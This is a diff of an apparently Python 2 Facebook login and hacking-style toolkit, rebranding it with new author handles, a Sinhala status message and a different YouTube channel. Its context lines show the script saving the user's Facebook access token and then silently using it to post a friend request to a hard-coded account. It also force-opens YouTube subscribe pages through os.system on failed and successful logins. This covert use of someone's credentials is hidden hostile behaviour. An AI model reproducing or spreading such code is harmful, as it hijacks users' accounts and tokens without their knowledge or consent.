@@ -61,15 +61,15 @@ logo = """
  WHATSAPP:0768914956
 \033[1;91m=======================================
 \033[1;96mAuthor  \033[1;93m: \033[1;92mkavindusubhash
-\033[1;96mInstagram \033[1;93m: \033[1; kavindusubhash
-\033[1;96mFacebook  \033[1;93m: \033[1; kavindusubhash
+\033[1;96mInstagram \033[1;93m: \033[1; mkavindusubhash
+\033[1;96mFacebook  \033[1;93m: \033[1; mkavindusubhash
 \033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/kavindusubhash
 \033[1;91m======================================="""
 
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m[●] \x1b[1;93mපුරනය වී ඇත\x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 
 
 back = 0
@@ -95,8 +95,8 @@ print  """\033[1;91m
        KING KAVIY
       WWHATSAPP:0768914956
 \033[1;96mAuthor  \033[1;93m: \033[1;92mkavindusubhash
-\033[1;96mInstagram \033[1;93m: \033[1; kavindusubhash
-\033[1;96mFacebook  \033[1;93m: \033[1; kavindusubhash
+\033[1;96mInstagram \033[1;93m: \033[1; mkavindusubhash
+\033[1;96mFacebook  \033[1;93m: \033[1; mkavindusubhash
 \033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/kavindusubhash
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
@@ -114,10 +114,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ?sub_confirmation=1 ')
+            os.system('xdg-open https://www.youtube.com/channel/UCRfQ6rFKOiiny32YNOhtf9Q?sub_confirmation=1 ')
     else:
         print "Wrong Username"
-        os.system('xdg-open  https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ?sub_confirmation=1 ')
+        os.system('xdg-open https://www.youtube.com/channel/UCRfQ6rFKOiiny32YNOhtf9Q?sub_confirmation=1 ')
 
 def login():
 	os.system('clear')
@@ -158,7 +158,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ?sub_confirmation=1')
+				os.system('xdg-open https://www.youtube.com/channel/UCRfQ6rFKOiiny32YNOhtf9Q ?sub_confirmation=1')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
